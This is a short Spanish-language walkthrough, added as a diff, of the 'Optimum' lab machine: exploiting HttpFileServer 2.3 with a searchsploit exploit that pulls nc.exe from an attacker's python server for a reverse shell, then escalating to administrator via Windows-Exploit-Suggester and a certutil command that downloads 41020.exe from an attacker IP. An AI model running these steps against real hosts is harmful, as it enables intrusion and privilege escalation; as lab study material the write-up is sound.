@@ -1,0 +1,73 @@
+maquina optimum --------------------------- windows 
+
+
+aprendizajes
+
+HFS
+Python
+Penetration Tester Level 2
+Network
+Vulnerability Assessment
+Injection
+Outdated Software
+Security Tools
+Metasploit
+OS Command Injection
+
+----------------------------------------------------
+
+en esta maquina cuando escaneamos con nmap vemos que tiene en la pagina
+un sistema de gestor de archivos donde te la opcion de logueos 
+
+el tema es que te sale en la pagina HttpFileServer 2.3 y solamente hemos 
+buscado eso en searchsploit, a ver que tiene varios exploits hemos probado
+elque sale en (3) y el que sale en (2) y hemos visto que el que sale en 2 funciona
+
+el sistema para que funcione es ofrecerle el nc al exploit con un servidor python y 
+el mismo exploit te pone que tienes que lanzarlo varias veces para que funcione 
+es decir la primera que vez que lo lanzas te manda el nc a la maquina victima 
+y el segundo te gana acceso a la maquina, 
+
+para eso tendras que tener montado un servidor python3 -m http.server en la carpeta donde tienes nc.exe
+
+y tambien estar en escucha por el puerto que le hayas indicado al exploit al editarlo.
+
+
+el tema es que no te deja ver mas que la flag
+de user, y a nosotros nos interesa el de administrador...
+
+hemos enumerado los grupos con el comando whoami /all y los servicios 
+
+pero no hemos visto nada significativo... por lo tanto hemos tirado de una herramienta que
+se llama 
+
+windows-exploit-suggester ... https://github.com/AonCyberLabs/Windows-Exploit-Suggester
+
+esta herramienta lo que hace es que con el systeminfo de la maquina intenta ganarte acceso con
+un binario que ya tiene hechos en la base de datos... 
+
+es decir... cuando tu estas dentro gracias al exploit, tienes que lanzar el systeminfo y te arroja
+la informacion del sistema y eso lo copias y pegas en un archivo que te hagas txt 
+
+luego es pasarle el archivo al windows-e-s--- con este comando 
+
+python2 windows-exploit-suggester -d <base de datos> -i <documento systeminfo.txt> 
+
+python2 windows-exploit-suggester.py -d 2023-01-07-mssb.xls -i ~eltrompazo/Desktop/maquinas/optimun/systeminfo.txt
+
+el programa te va a lanzar varios exploits para poder operar, y tu solo tienes que buscarlos en la web
+
+hemos cogido uno en concreto que es el 41020.exe
+
+y ahora tenemos que meterlo dentro de la maquina victima desde el user... 
+
+se hace con este comando 
+
+certutil.exe -f -urlcache -split http://10.10.14.25/41020.exe 41020.exe
+
+es lo mismo que un WGET para poder mandar archivos por lo que tendras que tener un python3 -m http.server 80
+montado en la carpeta donde tienes el exploit.exe
+
+y listo. lo ejecutas en la maquina y a correr
+
+
